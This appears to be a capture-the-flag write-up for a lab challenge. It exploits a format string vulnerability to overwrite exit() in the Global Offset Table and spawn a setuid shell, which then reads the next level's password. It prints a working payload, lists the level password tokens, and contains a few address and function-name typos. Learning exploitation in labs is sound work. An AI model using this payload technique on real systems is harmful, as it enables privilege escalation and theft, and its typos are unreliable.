# Level5 - Format string vulnerability - Code redirection with GOT Overwrite

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level5 | `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a` |
| level6 | `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute level5

```shell
./level5
(stdin) abcdef
> abcdef
```

Seems to be like previous levels.

Lets debug the binary

```shell
(gdb) info functions

> (...)
  0x080484a4  o
  0x080484c2  n
  0x08048504  main
  (...)
```

```shell
gdb-peda$ pdisas main
  0x0804850a <+6>:     call   0x80484c2 <n>                     # call n()

gdb-peda$ pdisas o
  0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0         # 0x80485f0: "/bin/sh"
  0x080484b1 <+13>:    call   0x80483b0 <system@plt>            # call system("/bin/sh")
  0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
  0x080484bd <+25>:    call   0x8048390 <_exit@plt>             # call _exit(1)

gdb-peda$ pdisas n
  0x080484cb <+9>:     mov    eax,ds:0x8049848                  # 0x8049848 <stdin@@GLIBC_2.0>
  0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
  0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
  0x080484dc <+26>:    lea    eax,[ebp-0x208]
  0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
  0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>             # call fgets(buf, 0x200, stdin)
  0x080484ea <+40>:    lea    eax,[ebp-0x208]
  0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
  0x080484f3 <+49>:    call   0x8048380 <printf@plt>            # call printf(buf)
  0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
  0x080484ff <+61>:    call   0x80483d0 <exit@plt>              # call exit(1)
```

We need to call `o`-function that creates a new shell.

n() calls exit(1) at the end of his routine. It means that we never return to main() ! So, what do we do now ? Well, we’ll use a trick called GOT Overwrite.

Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.

The goal here will be to overwrite the address of exit() in the GOT with the address of hello(). There are 4 steps here :

- Find the address of o()
- Find the address of exit() in GOT
- Find the offset of our string on the stack
- Write the proper exploit string

Let’s find the address of exit() and o()

```shell
# Get exit-syscall address
objdump -R ~/level5 | grep exit
> 08049828 R_386_JUMP_SLOT   _exit
  08049838 R_386_JUMP_SLOT   exit

# Get o-function address
objdump -t ~/level5 | grep -w o
> 080484a4 g     F .text  0000001e              o
```

It means we want to write the value `0x080484a4` at the address of exit: `0x08049838`

We need to know the buffer address.

```bash
gdb-peda$ b *p+54 # just after printf
gdb-peda$ run <<< AAAA
[------------------------------------stack-------------------------------------]
0000| 0xbffff430 --> 0xbffff440 ("AAAA\n")
0004| 0xbffff434 --> 0x200
0008| 0xbffff438 --> 0xb7fd1ac0 --> 0xfbad2088
0012| 0xbffff43c --> 0xb7ff37d0 (<__libc_memalign+16>:  add    ebx,0xb824)
0016| 0xbffff440 ("AAAA\n")
[------------------------------------------------------------------------------]
```

The buffer pointer is 4 addresses before the printf argument.

As `0x080484a4` is a big value, instead of print this value, we will split this integer with two short integers:

- High-order bytes: `0x0804` will be written at `0x08040838 + 2`
- Low-order bytes: `0x84a4` will be written at `0x08040838`

Basically, our format string should be something like:

```
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
   _____________________________________|                      |
   |           ________________________________________________|
   |           |
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
   |           |            |                       |
0x0804083a 0x08040838  (0x0804 - 8)         (0x84a4 - 0x0804)

=> "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"
```

> \_Note: VALUE_1 has to be greater than VALUE_2. Otherwise, switch addresses

Lets confirm that:

```bash
gdb-peda$ b *n+54 # after printf
> Breakpoint 1 at 0x80484f8

gdb-peda$ run < <(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"')
[------------------------------------stack-------------------------------------]
0000| 0xbffff420 --> 0xbffff430 --> 0x804983a --> 0x53e00804
0004| 0xbffff424 --> 0x200
0008| 0xbffff428 --> 0xb7fd1ac0 --> 0xfbad2088
0012| 0xbffff42c --> 0xb7ff37d0 (<__libc_memalign+16>:	add    ebx,0xb824)
0016| 0xbffff430 --> 0x804983a --> 0x53e00804                    # <----- %4$hn
0020| 0xbffff434 --> 0x8049838 --> 0x80484a4 (<o>:	push   ebp)  # <----- %5$hn
0024| 0xbffff438 ("%2044x%4$hn%31904x%5$hn\n")
[------------------------------------------------------------------------------]

gdb-peda$ x/x 0x8049838
> 0x8049838 <exit@got.plt>:	0x080484a4 # Perfect ! It contains our address

gdb-peda$ continue
> [New process 27345]
  process 27345 is executing new program: /bin/dash
  (...)
```

We perfectly overwritted the address of exit in the Global Offset Table. The new shell has been created but without setuid.
Let's try without gdb

```shell
python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/exploit5
cat /tmp/exploit5 - | ~/level5

$ whoami
> level6
$ cat /home/user/level6/.pass
> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

---

## Sources

### Format string vulnerability

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)

### Shell

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man system](https://linux.die.net/man/3/system)
- [Man exit](https://linux.die.net/man/3/exit)
- [Man \_exit](https://linux.die.net/man/2/_exit)
